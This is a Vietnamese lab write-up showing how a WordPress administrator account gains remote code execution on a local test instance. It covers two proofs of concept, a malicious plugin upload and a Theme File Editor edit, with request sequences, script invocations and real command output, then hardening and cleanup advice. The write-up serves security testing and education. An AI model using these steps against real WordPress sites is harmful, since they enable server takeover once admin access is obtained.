# Lab: WordPress Admin → RCE

Lab cô lập để trả lời câu hỏi: **một tài khoản Administrator của WordPress có thể
đạt được thực thi mã từ xa (RCE) bằng cách nào?** Toàn bộ hoạt động chỉ diễn ra trên
instance local do bạn sở hữu.

> **Cảnh báo phạm vi.** Chỉ chạy lab này trên máy/container của bạn. Không dùng
> kỹ thuật trong tài liệu này với hệ thống không được phép kiểm thử.
>
> **Lưu ý bảo mật quan trọng.** Đây **không phải lỗ hổng leo thang đặc quyền**.
> WordPress trao cho Administrator các capability `install_plugins`,
> `activate_plugins`, `edit_plugins`, `edit_themes`, `edit_files` — tức là quyền
> sửa mã PHP đang chạy. Administrator vốn đã tương đương RCE trên web server.
> Giá trị của lab là chứng minh điều đó bằng thực thi thật, và dùng nó để lý giải
> vì sao bảo vệ tài khoản admin quan trọng hơn "vá lỗi RCE".

## 1. Trạng thái lab trong sandbox này

Sandbox không có Docker daemon và không có quyền root, nên instance đang chạy được
dựng bằng **PHP static + SQLite** (không cần MySQL, không cài gì vào hệ thống):

| Thành phần | Giá trị |
| --- | --- |
| WordPress | 7.1.3 (`https://wordpress.org/latest.zip`) |
| PHP | 8.4.23 static CLI (`dl.static-php.dev`) |
| Database | SQLite qua plugin chính thức `sqlite-database-integration` |
| URL | <http://127.0.0.1:8899/> |
| Admin | `admin`; mật khẩu sinh tự động trong `.admin-credentials` (mode 600, ignored) |
| Thư mục web | `/workspace/lab/wordpress` |
| Server | PHP built-in server, 6 worker (`bin/start-server.sh`) |
| Log | `/workspace/lab/php-server.log`, `/workspace/lab/wp-debug.log` |

Quản lý server:

```sh
./bin/start-server.sh   # khởi động lại (in HTTP status)
./bin/stop-server.sh    # dừng theo PID file
```

Cài lại từ đầu trong môi trường không có Docker:

```sh
./bin/setup-local.sh    # tải PHP static, WordPress, WP-CLI, SQLite drop-in rồi cài
```

File `poc-plugin/wp-admin-rce-lab/wp-admin-rce-lab.php` và `bin/*.sh` là phần
lab được lưu trong repo; `wordpress/`, `downloads/`, binary PHP và cookie bị
`.gitignore` (xem `lab/.gitignore`).

## 2. Dựng bằng Docker trên máy của bạn

Yêu cầu: Docker Engine + Compose v2.

```sh
cd lab
./bin/setup-docker.sh
```

Script sẽ tạo `.env` (mật khẩu DB ngẫu nhiên) và `.admin-credentials` (mật khẩu
admin ngẫu nhiên), cả hai đều `chmod 600` và bị `.gitignore` bỏ qua. Không có
mật khẩu nào được lưu trong file tracked hay truyền qua command line.

`docker-compose.yml` gồm:

- `db`: MariaDB 11.4, healthcheck bằng `healthcheck.sh`;
- `wordpress`: ảnh `wordpress:latest`, publish `8899:80`, volume `wp_data`;
- `cli`: ảnh `wordpress:cli` dùng chung volume để cài WP;
- `WORDPRESS_CONFIG_EXTRA` cố ý để `DISALLOW_FILE_EDIT` và `DISALLOW_FILE_MODS`
  bằng `false` — đây là điều kiện của lab.

Đăng nhập: <http://127.0.0.1:8899/wp-admin/> với user `admin` và mật khẩu trong
`lab/.admin-credentials`.

Dọn sạch (xoá luôn DB và volume WordPress):

```sh
docker compose down -v
```

## 3. Đăng nhập admin bằng HTTP (không cần trình duyệt)

`bin/common.sh` thực hiện đúng luồng trình duyệt: lấy cookie
`wordpress_test_cookie`, POST `log`/`pwd` tới `wp-login.php`, theo redirect vào
`wp-admin/`, rồi kiểm tra phiên có quyền admin.

```sh
source bin/common.sh
wp_login /tmp/dashboard.html
```

Bằng chứng đã chạy:

```text
[+] logged in as 'admin' -> http://127.0.0.1:8899/wp-admin/
```

## 4. PoC #1 — Upload plugin độc hại (đường ngắn nhất)

Script: `bin/rce-poc.sh`

Luồng thực hiện, tất cả qua giao diện admin:

1. Đăng nhập `admin`.
2. Tạo ZIP `wp-admin-rce-lab.zip` từ `poc-plugin/`.
3. `GET /wp-admin/plugin-install.php?tab=upload` → lấy nonce của form upload.
4. `POST /wp-admin/update.php?action=upload-plugin` với `pluginzip` + nonce.
5. Lấy link kích hoạt trong response (hoặc từ `plugins.php`) và gọi
   `plugins.php?action=activate&plugin=...&_wpnonce=...`.
6. `GET /?wplab_rce=1` bằng cookie admin → plugin gọi `proc_open()` chạy lệnh OS
   và trả về output.

Chạy:

```sh
BASE_URL=http://127.0.0.1:8899 ./bin/rce-poc.sh
```

Kết quả thật trong sandbox:

```text
[*] target: http://127.0.0.1:8899
[+] logged in as 'admin' -> http://127.0.0.1:8899/wp-admin/
[+] plugin ZIP uploaded through wp-admin
[+] plugin activated (wp-admin/plugins.php)

[*] requesting /?wplab_rce=1 with the admin session
command: id; whoami; uname -sr; hostname; pwd
exit: 0
web-user: node
host: <sandbox-host>
cwd: /workspace/lab/wordpress/
--- stdout ---
uid=1000(node) gid=1000(node) groups=1000(node)
node
Linux 6.12.85+
/sandbox-host
/workspace/lab/wordpress
--- stderr ---

HTTP_STATUS:200

[+] RCE CONFIRMED: commands ran as the WordPress web-server user.
    anonymous request check:
    /?wplab_rce=1 without cookies -> HTTP 403
```

Điểm mấu chốt: lệnh chạy dưới **user của web server** (`node`, tương đương
`www-data` trong container), không phải user đăng nhập WordPress. Endpoint kiểm
tra `current_user_can('manage_options')` nên request ẩn danh nhận `403`; đây là
bằng chứng code chạy trong tiến trình PHP chứ không phải chức năng công khai.

Plugin cố ý chỉ chạy **một lệnh demo cố định** (`wplab_rce_demo_command()`) để
artifact là bằng chứng thực thi, không phải web shell đa dụng. Muốn thử lệnh khác
trong lab của bạn, sửa hàm đó rồi upload lại.

## 5. PoC #2 — Theme File Editor (`theme-editor.php`)

Script: `bin/theme-editor-poc.sh`

Đường này **không cần upload/plugin** và cũng không cần quyền cài đặt gì thêm:
chỉ cần `edit_themes` (Administrator có sẵn khi `DISALLOW_FILE_EDIT` là `false`).

1. Đăng nhập admin.
2. `GET /wp-admin/theme-editor.php?file=functions.php&theme=twentytwentyfive`
   → lấy nonce và nội dung `functions.php` hiện tại.
3. Nối thêm đoạn PHP kiểm tra `current_user_can('manage_options')` rồi
   `shell_exec('id; whoami')`.
4. `POST theme-editor.php` với `action=update` (WordPress trả `302` kèm `a=1`).
5. `GET /?theme_rce=1` → mã vừa ghi thực thi.

Chạy:

```sh
BASE_URL=http://127.0.0.1:8899 ./bin/theme-editor-poc.sh
```

Kết quả thật:

```text
[*] target: http://127.0.0.1:8899 (theme: twentytwentyfive, file: functions.php)
[+] logged in as 'admin' -> http://127.0.0.1:8899/wp-admin/
prepared functions.php payload
[+] functions.php overwritten through wp-admin/theme-editor.php
theme-editor RCE
uid=1000(node) gid=1000(node) groups=1000(node)
node

HTTP_STATUS:200

[+] RCE CONFIRMED via the Theme File Editor.
```

Bản gốc của theme được giữ tại `backup-functions.php.orig`; khôi phục bằng:

```sh
cp backup-functions.php.orig wordpress/wp-content/themes/twentytwentyfive/functions.php
```

## 6. Các đường admin → RCE khác (cùng bản chất)

Mọi đường dưới đây đều dựa trên capability chứ không phải lỗi memory-safety:

| Đường | Capability / điều kiện | Ghi chú |
| --- | --- | --- |
| Upload + activate plugin ZIP | `install_plugins`, `activate_plugins`, `DISALLOW_FILE_MODS=false` | Đã kiểm chứng (PoC #1) |
| Sửa file plugin/theme trong admin | `edit_plugins` / `edit_themes`, `DISALLOW_FILE_EDIT=false` | Đã kiểm chứng (PoC #2) |
| Upload + activate theme ZIP | `install_themes`, `switch_themes` | Cùng cơ chế với plugin |
| Cài plugin từ wordpress.org | `install_plugins` | Chỉ code có sẵn trên repo, ít linh hoạt hơn |
| Sửa `mu-plugins`/drop-in qua editor | `edit_files` (multisite: super admin) | Phụ thuộc cấu hình filesystem |
| Tạo admin mới rồi thao tác | `create_users`, `promote_users` | Không cần thiết khi đã là admin |

Những gì **không** hoạt động mặc định: upload PHP qua Media Library (bị chặn
bởi kiểm tra MIME/extension), chèn PHP vào Custom HTML block (không được thực
thi), sửa `wp-config.php` qua UI (không có màn hình nào cho phép).


## 7. Vì sao đây không phải lỗ hổng để "vá"

- Administrator có toàn quyền quản trị nội dung, plugin, theme, user và file.
  Bất kỳ ai có phiên admin đều có thể đưa PHP vào site; đó là thiết kế.
- RCE chỉ đạt được **sau khi** đã có credential admin hợp lệ. Kẻ tấn công cần
  lỗ hổng khác để lấy được phiên/credential trước (XSS lấy cookie, lộ mật khẩu,
  phishing, plugin lỗi thời, brute force…).
- Vì vậy biện pháp đúng là giảm thiệt hại khi admin bị chiếm, chứ không phải
  tìm cách "chặn admin chạy code".

## 8. Giảm thiểu / hardening

Trong `wp-config.php` (production):

```php
// Chặn cài/sửa/xoá plugin-theme-core qua admin.
define( 'DISALLOW_FILE_MODS', true );
// Chặn Theme/Plugin Editor (thường đã bị DISALLOW_FILE_MODS bao trùm).
define( 'DISALLOW_FILE_EDIT', true );
```

Khác:

- Tài khoản admin: mật khẩu mạnh + 2FA, SSO nếu có; không dùng chung; audit
  `wp_users`/`wp_usermeta` định kỳ.
- Giới hạn `/wp-admin` và `wp-login.php` theo IP/VPN; rate limit login.
- Tách quyền: biên tập viên không cần `install_plugins`/`edit_themes`; dùng
  plugin quản lý role thay vì cấp Administrator tràn lan.
- Filesystem immutable/read-only ở production (container read-only, mount
  `wp-content` có kiểm soát), deploy qua CI thay vì sửa web.
- Giám sát toàn vẹn file (`wp-content`, `wp-config.php`), cảnh báo plugin mới,
  user mới, thay đổi option `active_plugins`.
- WAF + malware scan; sao lưu ngoài site và diễn tập khôi phục.
- Với multisite: chỉ super admin có `edit_files`; siết `map_meta_cap`.

## 9. Dọn dẹp

```sh
./bin/stop-server.sh
# Docker:
docker compose down -v
# Xoá toàn bộ lab (cẩn thận: mất DB SQLite và WordPress):
rm -rf /workspace/lab
```

## 10. Bằng chứng lưu kèm

- `evidence/rce-plugin-upload.txt` — output đầy đủ PoC #1.
- `evidence/rce-theme-editor.txt` — output đầy đủ PoC #2.
- `evidence/rce-proof.txt` — file proof do plugin ghi ra ngoài docroot, cho thấy
  tiến trình web có quyền ghi filesystem.
- `evidence/environment.txt` — phiên bản WordPress/PHP, user, quyền, cấu hình
  liên quan.
- `README-privesc.md` + `evidence/subscriber-escalation.txt`,
  `evidence/registration-misconfig.txt`,
  `evidence/credential-and-enumeration.txt`,
  `evidence/sqlite-db-exposure.txt` — kiểm thử leo quyền subscriber → admin và
  tạo user khi chưa đăng nhập.
- `README-bbpress-password-search.md` + `bin/password-reply-search-poc.sh`,
  `fixtures/password-reply-search.php`,
  `evidence/bbpress-password-reply-search.txt`,
  `evidence/upstream-password-fix-diff.txt` — lỗ hổng High (CVSS 7.5): lộ nội
  dung reply trong topic/forum đặt mật khẩu qua WordPress search, chưa được vá
  trong snapshot local.

